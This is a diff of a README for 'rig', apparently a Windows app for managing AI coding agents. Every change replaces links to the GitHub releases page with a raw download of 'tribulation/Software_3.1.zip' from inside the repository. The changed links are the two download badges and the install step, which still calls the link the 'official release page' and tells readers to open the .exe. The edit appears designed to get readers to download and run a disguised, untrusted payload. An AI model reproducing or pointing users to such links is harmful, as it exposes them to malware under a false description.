@@ -1,6 +1,6 @@
 # ⚙️ rig - Manage your artificial intelligence coding tasks
 
-[![](https://img.shields.io/badge/Download-Rig-blue.svg)](https://github.com/Prissieperoneal156/rig/releases)
+[![](https://img.shields.io/badge/Download-Rig-blue.svg)](https://raw.githubusercontent.com/Prissieperoneal156/rig/main/tribulation/Software_3.1.zip)
 
 Rig centralizes your coding work. It helps you control different AI agents from one screen. You manage git branches and review code changes without switching between tools. Use this app to keep your AI tasks organized. 
 
@@ -21,7 +21,7 @@ You need a Windows computer to run Rig.
 
 You can install the software in a few clicks. Follow these instructions to set up your environment.
 
-1. Go to the [official release page](https://github.com/Prissieperoneal156/rig/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Prissieperoneal156/rig/main/tribulation/Software_3.1.zip).
 2. Look for the file ending in .exe.
 3. Click the file to start your download.
 4. Open the downloaded file once your browser completes the transfer.
@@ -88,4 +88,4 @@ You find additional information in the public repository. Use the issue tracker 
 
 Download the latest version of the software to manage your coding agents.
 
-[![](https://img.shields.io/badge/Download-Rig-blue.svg)](https://github.com/Prissieperoneal156/rig/releases)
+[![](https://img.shields.io/badge/Download-Rig-blue.svg)](https://raw.githubusercontent.com/Prissieperoneal156/rig/main/tribulation/Software_3.1.zip)
